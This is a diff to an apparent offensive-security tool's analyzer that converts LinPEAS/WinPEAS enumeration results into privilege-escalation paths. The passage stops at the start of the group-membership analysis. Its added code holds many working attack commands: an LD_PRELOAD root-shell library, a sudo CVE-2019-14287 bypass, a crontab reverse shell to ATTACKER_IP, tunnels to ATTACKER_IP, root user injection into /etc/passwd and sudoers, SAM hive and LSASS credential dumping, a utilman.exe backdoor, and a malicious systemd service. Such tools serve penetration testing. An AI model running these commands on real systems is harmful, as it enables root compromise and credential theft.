@@ -6,11 +6,14 @@ Analyzes parsed enumeration data and generates exploitation paths.
 from __future__ import annotations
 
 import json
+import logging
 import re
 from dataclasses import dataclass, field
 from enum import Enum
 from pathlib import Path
 from typing import TYPE_CHECKING
+
+logger = logging.getLogger(__name__)
 
 if TYPE_CHECKING:
     from whirlpool.parser.linpeas import LinPEASResults
@@ -36,6 +39,12 @@ class Category(Enum):
     TOKEN = "token"
     SCHEDULED_TASK = "scheduled_task"
     WILDCARD = "wildcard"
+    LOLBAS = "lolbas"
+    NETWORK = "network"
+    WRITABLE_FILE = "writable_file"
+    GROUP = "group"
+    UAC = "uac"
+    DLL = "dll"
     OTHER = "other"
 
 
@@ -139,6 +148,54 @@ class Analyzer:
                 data = json.load(f)
                 self._lolbas = data.get("binaries", {})
 
+        self._validate_data()
+
+    def _validate_data(self) -> None:
+        """Validate required keys in knowledge base entries, logging warnings for invalid ones."""
+        # Validate GTFOBins: each entry must be a dict
+        valid_gtfo: dict[str, dict] = {}
+        for name, entry in self._gtfobins.items():
+            if isinstance(entry, dict):
+                valid_gtfo[name] = entry
+            else:
+                logger.warning("GTFOBins entry %r is malformed (not a dict) - skipping", name)
+        self._gtfobins = valid_gtfo
+
+        # Validate kernel exploits: linux and windows sections
+        for platform in ("linux", "windows"):
+            section = self._kernel_exploits.get(platform, {})
+            valid_cves: dict[str, dict] = {}
+            for cve, info in section.items():
+                affected = info.get("affected_versions", {}) if isinstance(info, dict) else {}
+                if not isinstance(info, dict):
+                    logger.warning(
+                        "kernel_exploits[%s][%r] is not a dict - skipping", platform, cve
+                    )
+                elif "affected_versions" not in info:
+                    logger.warning(
+                        "kernel_exploits[%s][%r] missing 'affected_versions' - skipping", platform, cve
+                    )
+                elif platform == "linux" and "min" not in affected and "max" not in affected and "distro" not in affected:
+                    logger.warning(
+                        "kernel_exploits[linux][%r] 'affected_versions' missing 'min'/'max' - skipping", cve
+                    )
+                else:
+                    valid_cves[cve] = info
+            if platform in self._kernel_exploits:
+                self._kernel_exploits[platform] = valid_cves
+
+        # Validate potato matrix: each attack must have 'commands'
+        if "attacks" in self._potato_matrix:
+            valid_potatoes: dict[str, dict] = {}
+            for name, info in self._potato_matrix["attacks"].items():
+                if isinstance(info, dict) and "commands" in info:
+                    valid_potatoes[name] = info
+                else:
+                    logger.warning(
+                        "potato_matrix attack %r missing 'commands' key - skipping", name
+                    )
+            self._potato_matrix["attacks"] = valid_potatoes
+
     def analyze_linux(self, results: LinPEASResults) -> list[ExploitationPath]:
         """Analyze Linux enumeration results.
 
@@ -158,6 +215,11 @@ class Analyzer:
         paths.extend(self._analyze_kernel_linux(results))
         paths.extend(self._analyze_docker(results))
         paths.extend(self._analyze_nfs(results))
+        paths.extend(self._analyze_credentials_linux(results))
+        paths.extend(self._analyze_network_services(results))
+        paths.extend(self._analyze_writable_files(results))
+        paths.extend(self._analyze_sgid(results))
+        paths.extend(self._analyze_groups(results))
 
         return paths
 
@@ -178,6 +240,11 @@ class Analyzer:
         paths.extend(self._analyze_scheduled_tasks(results))
         paths.extend(self._analyze_kernel_windows(results))
         paths.extend(self._analyze_registry(results))
+        paths.extend(self._analyze_lolbas(results))
+        paths.extend(self._analyze_dll_hijack(results))
+        paths.extend(self._analyze_missing_patches(results))
+        paths.extend(self._analyze_uac(results))
+        paths.extend(self._analyze_ad_kerberos(results))
 
         return paths
 
@@ -306,7 +373,75 @@ class Analyzer:
         """Analyze sudo privileges."""
         paths = []
 
+        # Shell-escape binaries that allow breaking out even with specific file args
+        shell_escape_binaries = {
+            "vim": ":!/bin/sh",
+            "vi": ":!/bin/sh",
+            "less": "!/bin/sh",
+            "man": "!/bin/sh",
+            "more": "!/bin/sh",
+            "nmap": "--interactive then !sh (old nmap), or --script for newer",
+            "ftp": "!/bin/sh",
+            "gdb": "!/bin/sh",
+        }
+
         for sudo in getattr(results, 'sudo_rights', []):
+            raw_line = sudo.raw_line
+
+            # Detect LD_PRELOAD in env_keep
+            if "env_keep" in raw_line.lower() and "ld_preload" in raw_line.lower():
+                path = ExploitationPath(
+                    category=Category.SUDO,
+                    technique_name="Sudo LD_PRELOAD",
+                    description="sudo preserves LD_PRELOAD - library injection possible",
+                    finding=raw_line,
+                    commands=[
+                        "# Create malicious shared library:",
+                        "cat > /tmp/pe.c << 'EOF'",
+                        "#include <stdio.h>",
+                        "#include <sys/types.h>",
+                        "#include <stdlib.h>",
+                        "void _init() {",
+                        "    unsetenv(\"LD_PRELOAD\");",
+                        "    setuid(0); setgid(0);",
+                        "    system(\"/bin/bash -p\");",
+                        "}",
+                        "EOF",
+                        "gcc -fPIC -shared -nostartfiles -o /tmp/pe.so /tmp/pe.c",
+                        "sudo LD_PRELOAD=/tmp/pe.so <any_allowed_command>"
+                    ],
+                    confidence=Confidence.HIGH,
+                    risk=Risk.LOW,
+                    references=["https://www.hackingarticles.in/linux-privilege-escalation-using-ld_preload/"],
+                    reliability_score=95,
+                    safety_score=85,
+                    simplicity_score=80,
+                    stealth_score=50
+                )
+                paths.append(path)
+
+            # Detect CVE-2019-14287: (ALL, !root) bypass
+            if "!root" in raw_line.lower():
+                path = ExploitationPath(
+                    category=Category.SUDO,
+                    technique_name="Sudo CVE-2019-14287",
+                    description="sudo rule with (ALL, !root) can be bypassed with uid -1",
+                    finding=raw_line,
+                    commands=[
+                        "sudo -u#-1 /bin/bash",
+                        "# Or: sudo -u#4294967295 /bin/bash"
+                    ],
+                    prerequisites=["sudo < 1.8.28"],
+                    confidence=Confidence.MEDIUM,
+                    risk=Risk.LOW,
+                    references=["https://nvd.nist.gov/vuln/detail/CVE-2019-14287"],
+                    reliability_score=75,
+                    safety_score=90,
+                    simplicity_score=95,
+                    stealth_score=60
+                )
+                paths.append(path)
+
             for command in sudo.commands:
                 command = command.strip()
 
@@ -328,12 +463,58 @@ class Analyzer:
                     paths.append(path)
                     continue
 
+                # Detect wildcard in sudo command
+                if '*' in command:
+                    path = ExploitationPath(
+                        category=Category.SUDO,
+                        technique_name="Sudo Wildcard Injection",
+                        description=f"Sudo rule contains wildcard: {command}",
+                        finding=sudo.raw_line,
+                        commands=[
+                            f"# Sudo rule allows: {command}",
+                            "# Wildcard may allow argument injection",
+                            "# Example: if rule is /usr/bin/tar *",
+                            "sudo /usr/bin/tar cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh"
+                        ],
+                        confidence=Confidence.MEDIUM,
+                        risk=Risk.MEDIUM,
+                        reliability_score=65,
+                        safety_score=70,
+                        simplicity_score=60,
+                        stealth_score=40
+                    )
+                    paths.append(path)
+
                 # Extract binary from command
                 # Handle patterns like /usr/bin/vim, (root) /bin/bash, NOPASSWD: /usr/bin/find
                 binary_match = re.search(r'(/\S+)', command)
                 if binary_match:
                     binary_path = binary_match.group(1)
                     binary_name = Path(binary_path).name
+
+                    # Check for argument-escape binaries
+                    if binary_name in shell_escape_binaries:
+                        escape_cmd = shell_escape_binaries[binary_name]
+                        path = ExploitationPath(
+                            category=Category.SUDO,
+                            technique_name=f"Sudo {binary_name} Shell Escape",
+                            description=f"{binary_name} allows shell escape even with specific file arguments",
+                            finding=sudo.raw_line,
+                            commands=[
+                                f"sudo {binary_path} <any_allowed_args>",
+                                f"# Then type: {escape_cmd}"
+                            ],
+                            prerequisites=[] if sudo.nopasswd else ["Know user password"],
+                            confidence=Confidence.HIGH,
+                            risk=Risk.LOW,
+                            references=[f"https://gtfobins.github.io/gtfobins/{binary_name}/#sudo"],
+                            notes=f"Shell escape: {escape_cmd}",
+                            reliability_score=90,
+                            safety_score=90,
+                            simplicity_score=85,
+                            stealth_score=55
+                        )
+                        paths.append(path)
 
                     # Check GTFOBins
                     if binary_name in self._gtfobins:
@@ -634,6 +815,105 @@ class Analyzer:
 
         return paths
 
+    def _potato_os_compatible(self, os_version: str, os_compat: dict) -> bool:
+        """Check if an OS version string is compatible with a potato attack.
+
+        Extracts the Windows version number from os_version via regex (e.g. "2016",
+        "2019", "10", "11") and matches against os_compat keys rather than using
+        bidirectional substring containment which can produce false positives.
+
+        Args:
+            os_version: OS version string from WinPEAS (e.g. "Windows Server 2019")
+            os_compat: Dict of compat key -> bool from potato_matrix.json
+
+        Returns:
+            True if a matching compatible entry is found
+        """
+        # Extract the version tokens we care about from the detected OS string.
+        # Priority: Server year (2008/2012/2016/2019/2022) > desktop version (7/8/10/11)
+        server_year = re.search(r'\b(2003|2008|2012|2016|2019|2022)\b', os_version)
+        desktop_ver = re.search(r'\bWindows\s+(7|8\.1|8|10|11)\b', os_version, re.IGNORECASE)
+
+        for compat_key, supported in os_compat.items():
+            if not supported:
+                continue
+            # Extract version tokens from the compat key using the same approach
+            compat_server = re.search(r'\b(2003|2008|2012|2016|2019|2022)\b', compat_key)
+            compat_desktop = re.search(r'\b(7|8\.1|8|10|11)\b', compat_key)
+
+            if server_year and compat_server:
+                if server_year.group(1) == compat_server.group(1):
+                    return True
+            elif desktop_ver and compat_desktop:
+                if desktop_ver.group(1) == compat_desktop.group(1):
+                    return True
+
+        return False
+
+    def _analyze_lolbas(self, results: WinPEASResults) -> list[ExploitationPath]:
+        """Cross-reference Windows binaries against the LOLBAS database.
+
+        Looks for LOLBAS binaries in services, scheduled tasks, and writable paths.
+        Generates exploitation paths for any matches found.
+        """
+        paths: list[ExploitationPath] = []
+
+        if not self._lolbas:
+            return paths
+
+        # Collect binary names from services, scheduled tasks, and writable paths
+        candidate_binaries: dict[str, str] = {}  # binary_name.lower() -> source description
+
+        for service in getattr(results, 'services', []):
+            bp = service.binary_path
+            if bp:
+                name = Path(bp.strip('"')).name.lower()
+                candidate_binaries[name] = f"service: {service.name}"
+
+        for task in getattr(results, 'scheduled_tasks', []):
+            bp = task.binary_path
+            if bp:
+                name = Path(bp.strip('"')).name.lower()
+                candidate_binaries[name] = f"scheduled task: {task.name}"
+
+        for wp in getattr(results, 'writable_paths', []):
+            name = Path(wp).name.lower()
+            if name:
+                candidate_binaries[name] = f"writable path: {wp}"
+
+        # Match against LOLBAS database
+        for lolbas_binary, lolbas_info in self._lolbas.items():
+            if lolbas_binary.lower() not in candidate_binaries:
+                continue
+
+            source = candidate_binaries[lolbas_binary.lower()]
+            techniques = lolbas_info.get("techniques", {})
+
+            for technique_name, technique_info in techniques.items():
+                if not isinstance(technique_info, dict):
+                    continue
+                commands = technique_info.get("commands", [])
+                description = technique_info.get("description", f"LOLBAS {technique_name} via {lolbas_binary}")
+
+                path = ExploitationPath(
+                    category=Category.LOLBAS,
+                    technique_name=f"LOLBAS {lolbas_binary} ({technique_name})",
+                    description=description,
+                    finding=f"{lolbas_binary} found in {source}",
+                    commands=commands,
+                    confidence=Confidence.MEDIUM,
+                    risk=Risk.LOW,
+                    references=[f"https://lolbas-project.github.io/#{lolbas_binary}"],
+                    notes=f"MITRE: {', '.join(lolbas_info.get('mitre', []))}",
+                    reliability_score=70,
+                    safety_score=80,
+                    simplicity_score=75,
+                    stealth_score=70
+                )
+                paths.append(path)
+
+        return paths
+
     def _analyze_tokens(self, results: WinPEASResults) -> list[ExploitationPath]:
         """Analyze Windows token privileges."""
         paths = []
@@ -644,9 +924,12 @@ class Analyzer:
         potato_attacks = self._potato_matrix.get("attacks", {})
         decision_matrix = self._potato_matrix.get("decision_matrix", {})
 
+        # Build a set of privilege names for quick lookup
+        all_privs = {getattr(p, 'name', '') for p in privileges}
+
         # Check for SeImpersonate or SeAssignPrimaryToken
-        has_impersonate = any(p.name == "SeImpersonatePrivilege" for p in privileges)
-        has_assign_token = any(p.name == "SeAssignPrimaryTokenPrivilege" for p in privileges)
+        has_impersonate = "SeImpersonatePrivilege" in all_privs
+        has_assign_token = "SeAssignPrimaryTokenPrivilege" in all_privs
 
         if has_impersonate or has_assign_token:
             # Determine best potato based on OS version
@@ -656,9 +939,9 @@ class Analyzer:
                 if potato_name in potato_attacks:
                     potato = potato_attacks[potato_name]
 
-                    # Check OS compatibility
+                    # Check OS compatibility using explicit version number matching
                     os_compat = potato.get("os_compatibility", {})
-                    compatible = any(os_version in k or k in os_version for k in os_compat if os_compat.get(k, False))
+                    compatible = self._potato_os_compatible(os_version, os_compat)
 
                     if compatible or not os_version:  # If we can't determine OS, suggest anyway
                         path = ExploitationPath(
@@ -679,6 +962,128 @@ class Analyzer:
                         )
                         paths.append(path)
                         break  # Only add first compatible potato
+
+        # SeBackupPrivilege
+        if "SeBackupPrivilege" in all_privs:
+            path = ExploitationPath(
+                category=Category.POTATO,
+                technique_name="SeBackupPrivilege Abuse",
+                description="SeBackupPrivilege allows reading any file on the system",
+                finding="SeBackupPrivilege",
+                commands=[
+                    "# Copy SAM and SYSTEM hives:",
+                    r"robocopy /b C:\Windows\System32\config C:\temp SAM SYSTEM",
+                    "reg save HKLM\\SAM C:\\temp\\SAM",
+                    "reg save HKLM\\SYSTEM C:\\temp\\SYSTEM",
+                    "# Extract hashes offline:",
+                    "# impacket-secretsdump -sam SAM -system SYSTEM LOCAL"
+                ],
+                confidence=Confidence.HIGH,
+                risk=Risk.LOW,
+                references=["https://www.hackingarticles.in/windows-privilege-escalation-sebackupprivilege/"],
+                reliability_score=90,
+                safety_score=85,
+                simplicity_score=80,
+                stealth_score=50
+            )
+            paths.append(path)
+
+        # SeRestorePrivilege
+        if "SeRestorePrivilege" in all_privs:
+            path = ExploitationPath(
+                category=Category.POTATO,
+                technique_name="SeRestorePrivilege Abuse",
+                description="SeRestorePrivilege allows writing to any file on the system",
+                finding="SeRestorePrivilege",
+                commands=[
+                    "# Overwrite utilman.exe with cmd.exe for SYSTEM shell at login screen:",
+                    r"copy C:\Windows\System32\cmd.exe C:\Windows\System32\utilman.exe",
+                    "# At login screen press Win+U for SYSTEM cmd",
+                    "# Or overwrite other protected files"
+                ],
+                confidence=Confidence.MEDIUM,
+                risk=Risk.MEDIUM,
+                references=["https://www.hackingarticles.in/windows-privilege-escalation-serestoreprivilege/"],
+                reliability_score=75,
+                safety_score=60,
+                simplicity_score=70,
+                stealth_score=30
+            )
+            paths.append(path)
+
+        # SeDebugPrivilege
+        if "SeDebugPrivilege" in all_privs:
+            path = ExploitationPath(
+                category=Category.POTATO,
+                technique_name="SeDebugPrivilege Abuse",
+                description="SeDebugPrivilege allows debugging any process including LSASS",
+                finding="SeDebugPrivilege",
+                commands=[
+                    "# Dump LSASS for credential extraction:",
+                    "procdump.exe -ma lsass.exe lsass.dmp",
+                    "# Or use Task Manager -> lsass.exe -> Create dump file",
+                    "# Then: mimikatz # sekurlsa::minidump lsass.dmp",
+                    "# Or inject into a SYSTEM process:",
+                    "# migrate to a SYSTEM-owned process (e.g., winlogon.exe)"
+                ],
+                confidence=Confidence.HIGH,
+                risk=Risk.MEDIUM,
+                references=["https://www.hackingarticles.in/windows-privilege-escalation-sedebugprivilege/"],
+                reliability_score=90,
+                safety_score=65,
+                simplicity_score=75,
+                stealth_score=30
+            )
+            paths.append(path)
+
+        # SeLoadDriverPrivilege
+        if "SeLoadDriverPrivilege" in all_privs:
+            path = ExploitationPath(
+                category=Category.POTATO,
+                technique_name="SeLoadDriverPrivilege Abuse",
+                description="SeLoadDriverPrivilege allows loading kernel drivers for code execution",
+                finding="SeLoadDriverPrivilege",
+                commands=[
+                    "# Load vulnerable Capcom.sys driver:",
+                    "# 1. Download Capcom.sys and EoPLoadDriver",
+                    "EoPLoadDriver.exe System\\CurrentControlSet\\MyService C:\\temp\\Capcom.sys",
+                    "# 2. Run exploit to get SYSTEM shell via Capcom.sys",
+                    "ExploitCapcom.exe"
+                ],
+                prerequisites=["Capcom.sys driver file", "EoPLoadDriver tool"],
+                confidence=Confidence.MEDIUM,
+                risk=Risk.HIGH,
+                references=["https://github.com/TarlogicSecurity/EoPLoadDriver/"],
+                reliability_score=70,
+                safety_score=40,
+                simplicity_score=50,
+                stealth_score=20
+            )
+            paths.append(path)
+
+        # SeTakeOwnershipPrivilege
+        if "SeTakeOwnershipPrivilege" in all_privs:
+            path = ExploitationPath(
+                category=Category.POTATO,
+                technique_name="SeTakeOwnershipPrivilege Abuse",
+                description="SeTakeOwnershipPrivilege allows taking ownership of any file",
+                finding="SeTakeOwnershipPrivilege",
+                commands=[
+                    "# Take ownership of SAM file:",
+                    r"takeown /f C:\Windows\System32\config\SAM",
+                    r"icacls C:\Windows\System32\config\SAM /grant %username%:F",
+                    r"copy C:\Windows\System32\config\SAM C:\temp\SAM",
+                    "# Then extract hashes offline"
+                ],
+                confidence=Confidence.MEDIUM,
+                risk=Risk.MEDIUM,
+                references=["https://www.hackingarticles.in/windows-privilege-escalation-setakeownershipprivilege/"],
+                reliability_score=75,
+                safety_score=60,
+                simplicity_score=75,
+                stealth_score=30
+            )
+            paths.append(path)
 
         return paths
 
@@ -800,12 +1205,19 @@ class Analyzer:
             affected = exploit_info.get("affected_versions", {})
             affected_windows = affected.get("windows", [])
 
-            # Check if current version is affected
-            is_affected = any(
-                ver.lower() in os_version.lower() or
-                os_version.lower() in ver.lower()
-                for ver in affected_windows
-            )
+            # Check if current version is affected using version token extraction
+            is_affected = False
+            os_server = re.search(r'\b(2003|2008|2012|2016|2019|2022)\b', os_version)
+            os_desktop = re.search(r'\bWindows\s+(7|8\.1|8|10|11)\b', os_version, re.IGNORECASE)
+            for ver in affected_windows:
+                ver_server = re.search(r'\b(2003|2008|2012|2016|2019|2022)\b', ver)
+                ver_desktop = re.search(r'\b(7|8\.1|8|10|11)\b', ver)
+                if os_server and ver_server and os_server.group(1) == ver_server.group(1):
+                    is_affected = True
+                    break
+                if os_desktop and ver_desktop and os_desktop.group(1) == ver_desktop.group(1):
+                    is_affected = True
+                    break
 
             if is_affected:
                 reliability = exploit_info.get("reliability", "medium")
@@ -881,6 +1293,890 @@ class Analyzer:
 
         return paths
 
+    def _analyze_credentials_linux(self, results: LinPEASResults) -> list[ExploitationPath]:
+        """Analyze credential files found on Linux systems."""
+        paths: list[ExploitationPath] = []
+
+        # SSH keys
+        for key in getattr(results, 'ssh_keys', []):
+            path = ExploitationPath(
+                category=Category.CREDENTIALS,
+                technique_name="SSH Private Key",
+                description=f"SSH private key found: {key}",
+                finding=key,
+                commands=[
+                    f"chmod 600 {key}",
+                    f"ssh -i {key} root@localhost",
+                    f"# Or try other users: ssh -i {key} <user>@localhost"
+                ],
+                confidence=Confidence.HIGH,
+                risk=Risk.LOW,
+                reliability_score=85,
+                safety_score=95,
+                simplicity_score=90,
+                stealth_score=80
+            )
+            paths.append(path)
+
+        # Password files
+        for pfile in getattr(results, 'password_files', []):
+            path = ExploitationPath(
+                category=Category.CREDENTIALS,
+                technique_name="Password File",
+                description=f"Password file found: {pfile}",
+                finding=pfile,
+                commands=[
+                    f"cat {pfile}",
+                    "# Try extracted credentials:",
+                    "su root",
+                    "# Or for database credentials:",
+                    "mysql -u root -p<password>"
+                ],
+                confidence=Confidence.MEDIUM,
+                risk=Risk.LOW,
+                reliability_score=70,
+                safety_score=95,
+                simplicity_score=85,
+                stealth_score=75
+            )
+            paths.append(path)
+
+        # Config files with potential credentials
+        high_value_configs = [
+            "wp-config.php", ".env", "config.php", "database.yml",
+            "db.php", "settings.py", "application.properties",
+        ]
+        for cfile in getattr(results, 'config_files', []):
+            filename = Path(cfile).name.lower()
+            if any(hv in filename for hv in high_value_configs):
+                path = ExploitationPath(
+                    category=Category.CREDENTIALS,
+                    technique_name="Config File Credentials",
+                    description=f"Configuration file may contain credentials: {cfile}",
+                    finding=cfile,
+                    commands=[
+                        f"cat {cfile}",
+                        f"grep -i 'pass\\|secret\\|key\\|token\\|db_' {cfile}",
+                        "# Try extracted credentials with su or service logins"
+                    ],
+                    confidence=Confidence.MEDIUM,
+                    risk=Risk.LOW,
+                    reliability_score=65,
+                    safety_score=95,
+                    simplicity_score=90,
+                    stealth_score=80
+                )
+                paths.append(path)
+
+        return paths
+
+    def _analyze_network_services(self, results: LinPEASResults) -> list[ExploitationPath]:
+        """Analyze network services for privilege escalation opportunities."""
+        paths: list[ExploitationPath] = []
+
+        # Known port -> service mapping
+        port_service_map = {
+            3306: "MySQL",
+            5432: "PostgreSQL",
+            6379: "Redis",
+            27017: "MongoDB",
+            8080: "Web (HTTP)",
+            8443: "Web (HTTPS)",
+            9090: "Web Admin",
+            11211: "Memcached",
+        }
+
+        for svc in getattr(results, 'network_services', []):
+            local_addr = getattr(svc, 'local_address', '')
+            local_port = getattr(svc, 'local_port', 0)
+            program = getattr(svc, 'program', '')
+            pid = getattr(svc, 'pid', '')
+
+            # Flag services bound to localhost only (internal-only)
+            is_internal = local_addr in ('127.0.0.1', '::1', 'localhost')
+            if not is_internal:
+                continue
+
+            service_name = port_service_map.get(local_port, f"Unknown (port {local_port})")
+
+            commands = [
+                f"# Internal service: {service_name} on {local_addr}:{local_port}",
+                "# SSH local port forward:",
+                f"ssh -L {local_port}:127.0.0.1:{local_port} user@ATTACKER_IP",
+                "# Chisel (on attacker: chisel server -p 8000 --reverse):",
+                f"./chisel client ATTACKER_IP:8000 R:{local_port}:127.0.0.1:{local_port}",
+                "# Socat:",
+                f"socat TCP-LISTEN:{local_port},fork TCP:127.0.0.1:{local_port} &",
+                f"# Then connect locally to 127.0.0.1:{local_port}"
+            ]
+
+            # Add service-specific commands
+            if local_port == 3306:
+                commands.append("mysql -u root -h 127.0.0.1 -p")
+            elif local_port == 5432:
+                commands.append("psql -U postgres -h 127.0.0.1")
+            elif local_port == 6379:
+                commands.append("redis-cli -h 127.0.0.1")
+            elif local_port == 27017:
+                commands.append("mongo --host 127.0.0.1")
+            elif local_port == 11211:
+                commands.append("echo 'stats' | nc 127.0.0.1 11211")
+
+            notes_parts = []
+            if program:
+                notes_parts.append(f"Program: {program}")
+            if pid:
+                notes_parts.append(f"PID: {pid}")
+
+            path = ExploitationPath(
+                category=Category.CREDENTIALS,
+                technique_name=f"Internal Service: {service_name}",
+                description=f"{service_name} bound to {local_addr}:{local_port} - internal only, may have weak auth",
+                finding=f"{local_addr}:{local_port} ({service_name})",
+                commands=commands,
+                confidence=Confidence.MEDIUM,
+                risk=Risk.LOW,
+                notes=", ".join(notes_parts) if notes_parts else "",
+                reliability_score=60,
+                safety_score=90,
+                simplicity_score=70,
+                stealth_score=70
+            )
+            paths.append(path)
+
+        return paths
+
+    def _analyze_writable_files(self, results: LinPEASResults) -> list[ExploitationPath]:
+        """Analyze writable critical files and directories."""
+        paths: list[ExploitationPath] = []
+
+        # Collect all writable file paths from both sources
+        writable_paths: list[str] = []
+        for wf in getattr(results, 'writable_files', []):
+            writable_paths.append(getattr(wf, 'path', str(wf)))
+        for wd in getattr(results, 'writable_dirs', []):
+            writable_paths.append(wd if isinstance(wd, str) else str(wd))
+
+        # Critical file checks
+        critical_checks: dict[str, dict] = {
+            "/etc/passwd": {
+                "category": Category.CREDENTIALS,
+                "technique": "Writable /etc/passwd",
+                "description": "World-writable /etc/passwd allows adding root user",
+                "commands": [
+                    "openssl passwd -1 -salt xyz password123",
+                    '# Add root user: echo "hacker:$1$xyz$hash:0:0::/root:/bin/bash" >> /etc/passwd',
+                    "su hacker"
+                ],
+                "confidence": Confidence.HIGH,
+                "risk": Risk.LOW,
+                "reliability": 95,
+                "safety": 80,
+                "simplicity": 90,
+            },
+            "/etc/shadow": {
+                "category": Category.CREDENTIALS,
+                "technique": "Writable /etc/shadow",
+                "description": "World-writable /etc/shadow allows replacing root password hash",
+                "commands": [
+                    "# Generate new password hash:",
+                    "openssl passwd -6 -salt xyz password123",
+                    "# Replace root's hash in /etc/shadow with the generated hash",
+                    "# Then: su root (password: password123)"
+                ],
+                "confidence": Confidence.HIGH,
+                "risk": Risk.MEDIUM,
+                "reliability": 90,
+                "safety": 65,
+                "simplicity": 80,
+            },
+            "/etc/sudoers": {
+                "category": Category.SUDO,
+                "technique": "Writable /etc/sudoers",
+                "description": "World-writable /etc/sudoers allows granting sudo access",
+                "commands": [
+                    '# Add current user to sudoers:',
+                    'echo "<user> ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers',
+                    "sudo /bin/bash"
+                ],
+                "confidence": Confidence.HIGH,
+                "risk": Risk.LOW,
+                "reliability": 95,
+                "safety": 80,
+                "simplicity": 95,
+            },
+            "/etc/crontab": {
+                "category": Category.CRON,
+                "technique": "Writable /etc/crontab",
+                "description": "World-writable /etc/crontab allows adding malicious cron jobs",
+                "commands": [
+                    '# Add reverse shell cron:',
+                    'echo "* * * * * root /bin/bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1" >> /etc/crontab',
+                    "# Or: echo '* * * * * root cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash' >> /etc/crontab"
+                ],
+                "confidence": Confidence.HIGH,
+                "risk": Risk.MEDIUM,
+                "reliability": 90,
+                "safety": 70,
+                "simplicity": 85,
+            },
+        }
+
+        # Directories that indicate systemd unit writability
+        systemd_dirs = [
+            "/etc/systemd/system",
+            "/usr/lib/systemd/system",
+            "/lib/systemd/system",
+        ]
+
+        # Root dotfiles
+        root_dotfiles = ["/root/.bashrc", "/root/.profile", "/root/.bash_profile"]
+
+        for wp in writable_paths:
+            # Check critical files
+            if wp in critical_checks:
+                cc = critical_checks[wp]
+                path = ExploitationPath(
+                    category=cc["category"],  # type: ignore[arg-type]
+                    technique_name=str(cc["technique"]),
+                    description=str(cc["description"]),
+                    finding=wp,
+                    commands=list(cc["commands"]),  # type: ignore[arg-type]
+                    confidence=cc["confidence"],  # type: ignore[arg-type]
+                    risk=cc["risk"],  # type: ignore[arg-type]
+                    reliability_score=int(cc["reliability"]),
+                    safety_score=int(cc["safety"]),
+                    simplicity_score=int(cc["simplicity"]),
+                    stealth_score=40
+                )
+                paths.append(path)
+
+            # Check systemd unit directories
+            for sd in systemd_dirs:
+                if wp == sd or wp.startswith(sd + "/"):
+                    path = ExploitationPath(
+                        category=Category.SERVICE,
+                        technique_name="Writable Systemd Unit Directory",
+                        description=f"Writable systemd directory allows creating malicious services: {wp}",
+                        finding=wp,
+                        commands=[
+                            f"# Create malicious service in {wp}:",
+                            f"cat > {sd}/evil.service << 'EOF'",
+                            "[Unit]",
+                            "Description=Evil Service",
+                            "[Service]",
+                            "ExecStart=/bin/bash -c 'cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash'",
+                            "[Install]",
+                            "WantedBy=multi-user.target",
+                            "EOF",
+                            "systemctl daemon-reload",
+                            "systemctl start evil.service",
+                            "/tmp/rootbash -p"
+                        ],
+                        confidence=Confidence.HIGH,
+                        risk=Risk.MEDIUM,
+                        reliability_score=85,
+                        safety_score=65,
+                        simplicity_score=75,
+                        stealth_score=30
+                    )
+                    paths.append(path)
+                    break  # Only add once per writable path
+
+            # Check root dotfiles
+            if wp in root_dotfiles:
+                path = ExploitationPath(
+                    category=Category.WRITABLE_FILE,
+                    technique_name=f"Writable {Path(wp).name}",
+                    description=f"Writable root dotfile allows command injection on root login: {wp}",
+                    finding=wp,
+                    commands=[
+                        f"# Append payload to {wp}:",
+                        f"echo 'cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash' >> {wp}",
+                        "# Wait for root to log in, then:",
+                        "/tmp/rootbash -p"
+                    ],
+                    confidence=Confidence.MEDIUM,
+                    risk=Risk.LOW,
+                    reliability_score=65,
+                    safety_score=80,
+                    simplicity_score=85,
+                    stealth_score=40
+                )
+                paths.append(path)
+
+        return paths
+
+    def _analyze_sgid(self, results: LinPEASResults) -> list[ExploitationPath]:
+        """Analyze SGID binaries."""
+        paths: list[ExploitationPath] = []
+
+        # High-value group ownership for SGID binaries
+        high_value_groups = {
+            "shadow": {
+                "description": "SGID shadow group - can read /etc/shadow",
+                "commands": ["cat /etc/shadow", "# Crack hashes with john or hashcat"],
+            },
+            "disk": {
+                "description": "SGID disk group - raw disk access via debugfs",
+                "commands": ["debugfs /dev/sda1", "# In debugfs: cat /etc/shadow"],
+            },
+            "adm": {
+                "description": "SGID adm group - can read log files",
+                "commands": ["cat /var/log/auth.log | grep -i pass", "cat /var/log/syslog"],
+            },
+            "video": {
+                "description": "SGID video group - screen capture access",
+                "commands": ["cat /dev/fb0 > /tmp/screenshot.raw", "# Convert with ffmpeg or similar"],
+            },
+        }
+
+        for sgid in getattr(results, 'sgid_binaries', []):
+            binary_name = Path(sgid.path).name
+            group = getattr(sgid, 'group', '')
+
+            # Check GTFOBins (same as SUID)
+            if binary_name in self._gtfobins:
+                gtfo = self._gtfobins[binary_name]
+
+                if "suid" in gtfo:
+                    suid_info = gtfo["suid"]
+                    commands = []
+                    for cmd in suid_info.get("commands", []):
+                        actual_cmd = cmd.replace(f"./{binary_name}", sgid.path)
+                        commands.append(actual_cmd)
+
+                    path = ExploitationPath(
+                        category=Category.SUID,
+                        technique_name=f"SGID {binary_name}",
+                        description=suid_info.get("description", f"Exploit SGID bit on {binary_name}"),
+                        finding=sgid.path,
+                        commands=commands,
+                        confidence=Confidence.HIGH,
+                        risk=Risk.LOW,
+                        references=[f"https://gtfobins.github.io/gtfobins/{binary_name}/#suid"],
+                        reliability_score=85,
+                        safety_score=85,
+                        simplicity_score=85,
+                        stealth_score=65
+                    )
+                    paths.append(path)
+
+            # Check for high-value group ownership
+            if group in high_value_groups:
+                hv_info = high_value_groups[group]
+                path = ExploitationPath(
+                    category=Category.SUID,
+                    technique_name=f"SGID {binary_name} ({group} group)",
+                    description=str(hv_info["description"]),
+                    finding=f"{sgid.path} (group: {group})",
+                    commands=list(hv_info["commands"]),
+                    confidence=Confidence.MEDIUM,
+                    risk=Risk.LOW,
+                    reliability_score=75,
+                    safety_score=85,
+                    simplicity_score=80,
+                    stealth_score=60
+                )
+                paths.append(path)
+
+        return paths
+
+    def _analyze_groups(self, results: LinPEASResults) -> list[ExploitationPath]:
+        """Analyze user group memberships for privilege escalation."""
+        paths: list[ExploitationPath] = []
+
